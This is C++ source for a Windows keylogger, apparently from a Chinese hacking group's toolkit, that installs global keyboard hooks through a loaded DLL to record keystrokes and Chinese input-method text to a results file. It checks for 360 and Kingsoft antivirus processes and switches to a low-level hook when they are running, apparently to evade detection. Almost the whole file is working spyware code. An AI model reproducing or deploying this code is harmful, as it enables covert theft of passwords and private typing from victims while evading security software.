// KeyLogExe.cpp : 定义控制台应用程序的入口点。
//

/*===========================================================================
FileName:KeyBoardHook.cpp
Usage:KeyBoard Hook Class V1.2
发布： 火狐技术联盟[F.S.T] 2005/10/08
网站:http://www.wrsky.com
版权：原作者所有
=============================================================================*/

#ifndef TRACE
#define TRACE __noop
#endif

#include "KeyLogExe.h"
#include "../MyCommon.h"
#include "../until.h"
#include <imm.h>
#include <atlbase.h>
#include <io.h>
#pragma comment(lib,"imm32.lib") 
//----------------------------------------------------------------------------
#define UPWORD 1       //大写状态标记
#define LOWWORD 0      //小写状态标记
#define ShiftDown 1    //Shift键按下标记
#define ShiftUp 0      //Shift键弹起标记
#define WM_KEYHOOK       WM_USER+100 //键盘消息
#define WM_MSHOOK        WM_USER+101 //鼠标消息
#define WM_KEYHOOK_CN    WM_USER+102 //支持中文
#define WM_KEYHOOK_CN_EN WM_USER+103 //中英
#define WM_EXIT          WM_USER+104   //程序退出
#define MAX_CN_STRING_LEN 128
#define KBHOOKTYPE_EN    1           //纯原始钩子类型
#define KBHOOKTYPE_CN    2           //中文钩子
#define KBHOOKTYPE_CN_EN 3           //中英结合钩子

#define KEY_LOG_RESULT_PATH    "key_log_result_file_path"
#define EN_OR_CN_HOOK_HANDLE   "en_or_cn_hook_handle"



HINSTANCE dll_lib = NULL;
TCHAR tchKeyLogResultFilePath[MAX_PATH];
BOOL g_bStop;

DWORD dwKeyBoardMainThreadID = -1;

DWORD g_dwKBMainThreadID = 0;


/*

//-----------------------------------------------------------------------------
char KeyName[][20]={   //不可显示键的键名列表，总共34个
"Tab","CapsLock","Enter","Shift","Ctrl","Alt","Backspace","Ins","Home","End","Pause","Break","PgUp","PgDn","Delete","NumLock","Left","Right","Down","Up","Left Windows","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char PutKeyName[][20]={ //不可显示键的输出键名列表，总共34个
"Tab","CL","Enter","Sf","Cl","At","B-p","Is","Home","End","Ps","Bk","PU","PD","Del","NumL","Lt","Rt","Dn","Up","LtWin","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char    KeyOn[]={"~!@#$%^&*()_+{}|:\"<>?"};//具有上下对应字符键的对应数组表
char KeyUnder[]={"`1234567890-=[]\\;',./"};
//


-------*/

/*

char kl_filename[10][20]=
{
    "english.ime",
    "unispim.ime",
    "freewb.ime",
    "wingb.ime",
    "winpy.ime",
    "winzm.ime",
    "pintlgnt.ime",
    "winabc.ime",
    "winsp.ime",
    "surime.ime"
};
//
char kl_name[10][11]={//对应输入法名字
"<英文输入>",
"<紫光拼音>",
"<极点五笔>",
"<内码输入>",
"<全拼输入>",
"<郑码输入>",
"<微软拼音>",
"<智能ABC>",
"<双拼输入>",
"<增强内码>"
};

*/

//









KeyBoardHookEx::KeyBoardHookEx()
{

	canlog=1;
	index=1;
	CNString[2]='\0';


	pHookHandle = NULL;



	HANDLE hCNString=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_CN_STRING_LEN,"CNString");
	HANDLE hWHandle=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(DWORD),"MsgTime");

	HANDLE hHookHandle=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(HHOOK),EN_OR_CN_HOOK_HANDLE);
	HANDLE hResultPath=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_PATH,KEY_LOG_RESULT_PATH);
	
	Sleep(100);

	bIsStart = FALSE;
	
}
//
KeyBoardHookEx::~KeyBoardHookEx()
{
	if(bIsStart)
	{
		Stop();
	}
	
}









//function 4:
int KeyBoardHookEx::InitLibrary(void){
  if(dll_lib==NULL) dll_lib=LoadLibrary(this->KBINFO.Dll_path);//加载HOOK连接库
  if(dll_lib==NULL){
   //TRACE("load library failed!\r\n");
   return 0;
   }
  else{
   //TRACE("load library ok!\r\n");
   return 1;
   }
}
//
void KeyBoardHookEx::RemoveLibrary(void)
{
  if(dll_lib) FreeLibrary(dll_lib);
  dll_lib = NULL;

}
//function 7:


//function 8:
int KeyBoardHookEx::Stop(void)
{
	
	if(!bIsStart)
	{
		return 0;
	}  
	
	
	
	Sleep(500);
	

	if(dll_lib!=NULL)
	{
		void (*dllStopProcessThread)();
		(FARPROC &)dllStopProcessThread=GetProcAddress(dll_lib,"dllStopProcessThread");
		if(dllStopProcessThread)
		{
			//TRACE("get dllStopProcessThread ok\r\n");
			dllStopProcessThread();

		} 

	}

	StopKeyBoardHook();    


	RemoveLibrary();
	dll_lib = NULL;

	bIsStart = FALSE;

	return 0;
}









//------------------------------------
int KeyBoardHookEx::StartKeyBoardHook()
{
	
	
	if(dll_lib==NULL)
	{
		return -1;

	}



	HANDLE hHookHandle=OpenFileMapping(FILE_MAP_WRITE,false,EN_OR_CN_HOOK_HANDLE); 

	pHookHandle=(HHOOK *)MapViewOfFile(hHookHandle,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);

	memset(pHookHandle,0,sizeof(HHOOK));

	//printf("开始获得钩子句柄\n");

	if(NULL == pHookHandle)
	{
		
		//printf("获得钩子句柄出错\n");
		return -1;

	}


	   
	if(!MyCommon::IsServerStart("ctfmon")) //caodan
	{
	
	
		
		if (GetProcessID("360sd.exe")||
			GetProcessID("360tray.exe")||
			GetProcessID("ZhuDongFangYu.exe")||
			GetProcessID("KSafeTray.exe")
			)
		{
			
			
			HOOKPROC KBhookCn_deal= (HOOKPROC)GetProcAddress(dll_lib,"_KBhook_deal@12");
			if(!KBhookCn_deal)
			{
				//printf("KBhookCn_deal 为空\n");
				return -1;

			}


			//TRACE("get KBhookCn_deal ok\r\n");



			if(pHookHandle!=NULL)
			{
				*pHookHandle=SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)KBhookCn_deal,GetModuleHandle(0),0);//设置原始键盘钩子

				//printf("pHookHandle= %u\n",pHookHandle);
				//printf("调用了英文钩子\n");
			}


			return 0;
		}
		

	}


	HOOKPROC KBhookCn_deal= (HOOKPROC)GetProcAddress(dll_lib,"_KBhookCnDeal@12");
	if(!KBhookCn_deal)
	{
		return -1;

	}


	//TRACE("get KBhookCn_deal ok\r\n");


	if(pHookHandle!=NULL)
	{    

		*pHookHandle=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)KBhookCn_deal,dll_lib,0);//设置全局钩子
		//printf("调用了中文钩子\n");

	}
	

	return 0;
}


int KeyBoardHookEx::StopKeyBoardHook()
{
	if(pHookHandle)
	{
		UnhookWindowsHookEx(*pHookHandle); //卸载钩子
		pHookHandle = NULL;
	}

	return 0;

}








/*


BOOL ReplaceDllFile(const TCHAR *srcFile,const TCHAR *replaceFile)
{
	if( (-1 == _access(srcFile,0)) && (-1 == _access(replaceFile,0)) )
	{
		//printf("啥都没有\n");
		return FALSE;
	}

	if(-1 != _access(replaceFile,0))
	{
		remove(srcFile);
		MoveFile(replaceFile,srcFile);
	
	}
	return TRUE;

}

*/


int KeyBoardHookEx::Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath)
{

	if(bIsStart)
	{
		return 0;
	}

	int iRes = -1;
	TCHAR *pResultPath = NULL;
	
	bIsStart = TRUE;
	if(NULL == tchHookDllName)
	{
		
		goto FUNC_END;
	
	}

	if(strlen(tchResFilePath) <4) //保证大于C:/
	{
		
		goto FUNC_END;

	}



	HANDLE hResultPath = OpenFileMapping(FILE_MAP_WRITE,false,KEY_LOG_RESULT_PATH); 

	if(NULL == hResultPath)
	{
		
		goto FUNC_END;

	}
	pResultPath=(char *)MapViewOfFile(hResultPath,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
	if(NULL == pResultPath)
	{
		
		
		goto FUNC_END;
	}

	memset(pResultPath,0,MAX_PATH);

	strncpy(pResultPath,tchResFilePath,MAX_PATH);
	
	if(TCHAR(*(pResultPath + strlen(pResultPath) -1)) != '\\')
	{
		
		strcat(pResultPath,"\\");
	}




	memset(&KBINFO,0,sizeof(KEYBOARDINFO));



	strncpy(KBINFO.Dll_path,tchHookDllName,MAX_PATH);


	InitLibrary();



	if(dll_lib!=NULL)
	{
		int (*dllStartProcessThread)();
		(FARPROC &)dllStartProcessThread=GetProcAddress(dll_lib,"dllStartProcessThread");
		if(dllStartProcessThread)
		{
			//TRACE("get dllStartProcessThread ok\r\n");
			if(dllStartProcessThread() < 0)
			{
				goto FUNC_END;

			}

			if(StartKeyBoardHook() >= 0)
			{

				iRes = 0;
			}
		} 


	}




FUNC_END:

	if(iRes < 0)
	{
		
	
		RemoveLibrary();

		bIsStart = FALSE;
	}
	


	return iRes;
}



//##################################################KeyBoardHook#########


KeyBoardHook::KeyBoardHook()
{
	
	g_bStop = FALSE;
	hMainThread = NULL;
	bStart = FALSE;
	dwKeyBoardMainThreadID = -1;

}


KeyBoardHook::~KeyBoardHook()
{
	
	if(bStart)
	{
		Stop();
	}

}




DWORD WINAPI KeyBoardThreadWork(LPVOID lparam)
{

	dwKeyBoardMainThreadID = GetCurrentThreadId();

	g_dwKBMainThreadID = dwKeyBoardMainThreadID;

	stu_thread_param *pStuThreadParam = (stu_thread_param *)lparam;

	
	KeyBoardHookEx kbh;

	kbh.Start(pStuThreadParam->tchHookDllName,pStuThreadParam->tchResFilePath);



	MSG msg;



	while(GetMessage(&msg,0,0,0))
	{


		if(msg.message == WM_EXIT)
		{
			break;

		}

		TranslateMessage(&msg);
		DispatchMessage(&msg);

		if(g_bStop)
		{
			break;
		}
	
	}

	//printf("键盘记录线程退出了\n");

	kbh.Stop();

	g_dwKBMainThreadID = 0;

	return 0;
}





int KeyBoardHook::Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath)
{


	if(bStart)
	{
		return 0;
	}


	int iRes = -1;

	if(NULL == tchHookDllName || NULL == tchResFilePath)
	{
		goto START_FUNC_END;
	}

	memset(&stuThreadParam,0,sizeof(stu_thread_param));

	strncpy(stuThreadParam.tchHookDllName,tchHookDllName,MAX_PATH);
	strncpy(stuThreadParam.tchResFilePath,tchResFilePath,MAX_PATH);


	hMainThread = CreateThread(NULL,0,KeyBoardThreadWork,&stuThreadParam,0,NULL);

	if(NULL == hMainThread)
	{
		goto START_FUNC_END;
	}

	bStart = TRUE;
	iRes = 1;

START_FUNC_END:
	
	return iRes;


}





int KeyBoardHook::Stop(void)
{
	g_bStop = TRUE;

	
	PostThreadMessage(dwKeyBoardMainThreadID,WM_EXIT,NULL,NULL);

	Sleep(10);

	WaitForSingleObject(hMainThread,INFINITE);

	bStart = FALSE;
	g_bStop = FALSE;

	CloseHandle(hMainThread);
	hMainThread = NULL;

	//printf("键盘记录EX停止工作了\n");

	

	return 0;

}